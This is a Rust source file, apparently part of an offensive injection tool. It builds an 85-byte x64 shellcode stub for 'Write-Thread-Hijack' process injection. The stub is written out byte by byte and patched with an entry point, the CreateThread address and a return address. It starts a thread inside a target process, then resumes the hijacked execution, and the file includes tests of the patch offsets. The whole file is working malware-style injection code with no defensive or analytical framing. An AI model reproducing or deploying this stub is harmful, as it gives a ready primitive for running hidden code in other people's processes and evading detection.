//! 85-byte x64 shellcode stub — WTH (Write-Thread-Hijack) injector prologue.
//!
//! Layout:
//!   [0..22]   save non-volatile regs (push rbx/rbp/rdi/rsi/r12-r15), sub rsp,0x30
//!   [22..30]  OEP slot   — mov r8, imm64  (CreateThread lpStartAddress)
//!   [30..47]  xor r9/eax, shadow-space zeroing
//!   [47..55]  CreateThread VA slot — mov rax, imm64
//!   [55..65]  call rax, add rsp,0x30
//!   [65..75]  restore r15-r12, rsi/rdi/rbp/rbx
//!   [75..83]  orig-return slot — mov rax, imm64
//!   [83..85]  jmp rax

/// Build the 85-byte stub, patching three 8-byte VA slots.
///
/// # Arguments
/// * `oep`            - Target OEP (passed as `lpStartAddress` to CreateThread)
/// * `createthread_va`- Resolved VA of `CreateThread` in the target
/// * `orig_return`    - Original bytes / return address the stub jumps to on exit
pub fn build(oep: u64, createthread_va: u64, orig_return: u64) -> [u8; 85] {
    #[rustfmt::skip]
    let mut s: [u8; 85] = [
        // --- save non-volatile registers ---
        0x53,                                           // push rbx
        0x55,                                           // push rbp
        0x57,                                           // push rdi
        0x56,                                           // push rsi
        0x41, 0x54,                                     // push r12
        0x41, 0x55,                                     // push r13
        0x41, 0x56,                                     // push r14
        0x41, 0x57,                                     // push r15
        // --- allocate shadow space (0x30 = 48 bytes) ---
        0x48, 0x83, 0xEC, 0x30,                         // sub rsp, 0x30
        // --- set up CreateThread args ---
        0x33, 0xC9,                                     // xor ecx, ecx   (lpThreadAttributes = NULL)
        0x33, 0xD2,                                     // xor edx, edx   (dwStackSize = 0)
        0x49, 0xB8, 0,0,0,0,0,0,0,0,                   // mov r8, imm64  [OEP  @ bytes 22..30]
        0x4D, 0x31, 0xC9,                               // xor r9, r9     (lpParameter = NULL)
        0x33, 0xC0,                                     // xor eax, eax   (scratch)
        0x48, 0x89, 0x44, 0x24, 0x20,                   // mov [rsp+0x20], rax  (dwCreationFlags)
        0x48, 0x89, 0x44, 0x24, 0x28,                   // mov [rsp+0x28], rax  (lpThreadId)
        // --- call CreateThread ---
        0x48, 0xB8, 0,0,0,0,0,0,0,0,                   // mov rax, imm64 [CT VA @ bytes 47..55]
        0xFF, 0xD0,                                     // call rax
        // --- restore stack and non-volatile registers ---
        0x48, 0x83, 0xC4, 0x30,                         // add rsp, 0x30
        0x41, 0x5F,                                     // pop r15
        0x41, 0x5E,                                     // pop r14
        0x41, 0x5D,                                     // pop r13
        0x41, 0x5C,                                     // pop r12
        0x5E,                                           // pop rsi
        0x5F,                                           // pop rdi
        0x5D,                                           // pop rbp
        0x5B,                                           // pop rbx
        // --- jump to original return address ---
        0x48, 0xB8, 0,0,0,0,0,0,0,0,                   // mov rax, imm64 [ret @ bytes 75..83]
        0xFF, 0xE0,                                     // jmp rax
    ];

    s[22..30].copy_from_slice(&oep.to_le_bytes());
    s[47..55].copy_from_slice(&createthread_va.to_le_bytes());
    s[75..83].copy_from_slice(&orig_return.to_le_bytes());
    s
}

#[cfg(test)]
mod tests {
    use super::build;

    #[test]
    fn length_is_85() {
        assert_eq!(build(0, 0, 0).len(), 85);
    }

    #[test]
    fn oep_patch_at_22() {
        let s = build(0x1111111111111111, 0, 0);
        assert_eq!(&s[22..30], &0x1111111111111111u64.to_le_bytes());
    }

    #[test]
    fn createthread_at_47() {
        let s = build(0, 0x2222222222222222, 0);
        assert_eq!(&s[47..55], &0x2222222222222222u64.to_le_bytes());
    }

    #[test]
    fn return_at_75() {
        let s = build(0, 0, 0x3333333333333333);
        assert_eq!(&s[75..83], &0x3333333333333333u64.to_le_bytes());
    }
}
